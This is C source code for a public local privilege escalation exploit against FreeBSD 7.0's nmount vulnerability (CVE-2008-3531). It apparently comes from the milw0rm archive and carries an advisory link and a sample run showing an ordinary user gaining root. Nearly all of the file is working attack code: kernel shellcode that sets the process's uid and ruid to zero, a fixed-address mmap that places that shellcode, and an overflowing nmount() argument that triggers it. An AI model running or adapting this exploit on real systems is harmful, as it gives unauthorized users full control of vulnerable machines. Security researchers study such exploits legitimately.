/* 
 * cve-2008-3531.c -- Patroklos Argyroudis, argp at domain census-labs.com
 *
 * Privilege escalation exploit for the FreeBSD-SA-08:08.nmount
 * (CVE-2008-3531) vulnerability:
 * 
 * http://security.freebsd.org/advisories/FreeBSD-SA-08:08.nmount.asc
 * http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2008-3531
 *
 * For a detailed analysis see:
 *
 * http://census-labs.com/news/2009/07/02/cve-2008-3531-exploit/
 * 
 * Sample run:
 * 
 * [argp@leon ~]$ uname -rsi
 * FreeBSD 7.0-RELEASE GENERIC
 * [argp@leon ~]$ sysctl vfs.usermount
 * vfs.usermount: 1
 * [argp@leon ~]$ id
 * uid=1001(argp) gid=1001(argp) groups=1001(argp)
 * [argp@leon ~]$ gcc -Wall cve-2008-3531.c -o cve-2008-3531
 * [argp@leon ~]$ ./cve-2008-3531
 * [*] vptr = 0x006e776f
 * [*] calling nmount()
 * nmount: Unknown error: -1036235776
 * [argp@leon ~]$ id
 * uid=0(root) gid=0(wheel) egid=1001(argp) groups=1001(argp)
 *
 * $Id: cve-2008-3531.c,v 846ca34be34a 2009/02/29 11:05:02 argp $
 */

#include <sys/param.h>
#include <sys/mount.h>
#include <sys/uio.h>
#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sysexits.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

#define BUFSIZE     249

#define PAGESIZE    4096
#define ADDR        0x6e7000
#define OFFSET      1903

#define FSNAME      "msdosfs"
#define DIRPATH     "/tmp/msdosfs"

unsigned char kernelcode[] =
"\x64\xa1\x00\x00\x00\x00"   /* movl  %fs:0, %eax      # get curthread */
"\x8b\x40\x04"               /* movl  0x4(%eax), %eax  # get proc from curthread */
"\x8b\x40\x30"               /* movl  0x30(%eax),%eax  # get ucred from proc */
"\x31\xc9"                   /* xorl  %ecx, %ecx       # ecx = 0 */
"\x89\x48\x04"               /* movl  %ecx, 0x4(%eax)  # ucred.uid = 0 */
"\x89\x48\x08"               /* movl  %ecx, 0x8(%eax)  # ucred.ruid = 0 */
                             /* # return to the pre-previous function, i.e. vfs_donmount() */
"\x81\xc4\xe8\x00\x00\x00"   /* addl  $0xe8, %esp */
"\x5b"                       /* popl  %ebx */
"\x5e"                       /* popl  %esi */
"\x5f"                       /* popl  %edi */
"\x5d"                       /* popl  %ebp */
"\xc3";                      /* ret */

int
main()
{
    void *vptr;
    struct iovec iov[6];

    vptr = mmap((void *)ADDR, PAGESIZE, PROT_READ | PROT_WRITE,
            MAP_FIXED | MAP_ANON | MAP_PRIVATE, -1, 0);

    if(vptr == MAP_FAILED)
    {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    vptr += OFFSET;
    printf("[*] vptr = 0x%.8x\n", (unsigned int)vptr);

    memcpy(vptr, kernelcode, (sizeof(kernelcode) - 1));

    mkdir(DIRPATH, 0700);

    iov[0].iov_base = "fstype";
    iov[0].iov_len = strlen(iov[0].iov_base) + 1;
    
    iov[1].iov_base = FSNAME;
    iov[1].iov_len = strlen(iov[1].iov_base) + 1;
    
    iov[2].iov_base = "fspath";
    iov[2].iov_len = strlen(iov[2].iov_base) + 1;
    
    iov[3].iov_base = DIRPATH;
    iov[3].iov_len = strlen(iov[3].iov_base) + 1;

    iov[4].iov_base = calloc(BUFSIZE, sizeof(char));

    if(iov[4].iov_base == NULL)
    {
        perror("calloc");
        rmdir(DIRPATH);
        exit(EXIT_FAILURE);
    }

    memset(iov[4].iov_base, 0x41, (BUFSIZE - 1));
    iov[4].iov_len = BUFSIZE;

    iov[5].iov_base = "BBBB";
    iov[5].iov_len = strlen(iov[5].iov_base) + 1;

    printf("[*] calling nmount()\n");

    if(nmount(iov, 6, 0) < 0)
    {
        perror("nmount");
        rmdir(DIRPATH);
        exit(EXIT_FAILURE);
    }

    printf("[*] unmounting and deleting %s\n", DIRPATH);
    unmount(DIRPATH, 0);
    rmdir(DIRPATH);

    return EXIT_SUCCESS;
}

// milw0rm.com [2009-07-09]
